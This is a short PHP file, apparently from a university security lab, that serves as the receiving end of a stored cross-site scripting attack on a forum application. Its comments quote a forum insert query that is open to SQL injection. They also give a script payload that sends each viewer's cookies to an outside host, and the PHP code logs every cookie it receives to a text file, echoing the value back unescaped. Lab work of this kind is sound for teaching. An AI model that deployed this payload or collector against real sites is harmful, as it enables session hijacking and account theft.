	
    
			<!-- // http://w3schools.sinsixx.com/php/php_mysql_insert.asp.htm
			// text/javascript has to be "" in "text/javascript" becasue in post.php,  
            // mysql_query("INSERT INTO threads (username, title, message, date) VALUES('".$_COOKIE['hackme']."', '". $_POST['title']."', '". $_POST[message]."', '".time()."')")or die(mysql_error()); -->
			
            <!-- input string, XSS_input.txt, put into the post is as follows, so that show.php when echo this message it will causes the embeeded following js executed in html file of anyone who views this page-->
            <!-- <script type="text/javascript">var myImage = new Image();myImage.src="http://fiona.utdallas.edu/~zxw180035/xss/steal.php?cookiestolen=" + document.cookie;console.log(myImage.src);</script> -->
		
            <!-- cookie introduction:  https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies# -->

<?php
	
	if(empty($_GET)){
        echo "_GET empty!<br>";
    }
    else {

		$cookiestolen= $_GET["cookiestolen"];
        echo "$cookiestolen";
        $fp = fopen('xss_cookie.txt', 'a') or  die ("Unable to open file!");;
        fwrite($fp, $cookiestolen."\n");
        fclose($fp);

    }

?>  


